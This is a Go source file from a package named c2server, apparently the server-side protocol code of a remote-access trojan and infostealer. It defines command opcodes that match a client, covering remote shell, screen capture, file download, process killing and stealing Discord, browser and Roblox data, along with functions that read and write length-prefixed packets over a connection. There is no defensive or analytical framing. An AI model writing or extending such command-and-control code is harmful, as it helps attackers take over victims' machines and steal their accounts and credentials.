package c2server

import (
	"encoding/binary"
	"io"
)

// Command opcodes (matches client)
const (
	CmdHello         uint8 = 0x01
	CmdHeartbeat     uint8 = 0x02
	CmdShell         uint8 = 0x03
	CmdScreenStart   uint8 = 0x10
	CmdScreenStop    uint8 = 0x11
	CmdScreenFrame   uint8 = 0x12
	CmdFileList      uint8 = 0x20
	CmdFileDownload  uint8 = 0x21
	CmdProcessList   uint8 = 0x30
	CmdProcessKill   uint8 = 0x31
	CmdStealDiscord  uint8 = 0x40
	CmdStealBrowser  uint8 = 0x41
	CmdStealRoblox   uint8 = 0x42
)

// Packet structure
type Packet struct {
	Opcode uint8
	Length uint32
	Data   []byte
}

// Read packet from connection
func ReadPacket(conn io.Reader) (*Packet, error) {
	// Read opcode (1 byte)
	opcodeBuf := make([]byte, 1)
	if _, err := io.ReadFull(conn, opcodeBuf); err != nil {
		return nil, err
	}

	// Read length (4 bytes)
	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		return nil, err
	}
	length := binary.LittleEndian.Uint32(lengthBuf)

	// Read data
	data := make([]byte, length)
	if length > 0 {
		if _, err := io.ReadFull(conn, data); err != nil {
			return nil, err
		}
	}

	return &Packet{
		Opcode: opcodeBuf[0],
		Length: length,
		Data:   data,
	}, nil
}

// Write packet to connection
func WritePacket(conn io.Writer, opcode uint8, data []byte) error {
	// Write opcode
	if _, err := conn.Write([]byte{opcode}); err != nil {
		return err
	}

	// Write length
	lengthBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lengthBuf, uint32(len(data)))
	if _, err := conn.Write(lengthBuf); err != nil {
		return err
	}

	// Write data
	if len(data) > 0 {
		if _, err := conn.Write(data); err != nil {
			return err
		}
	}

	return nil
}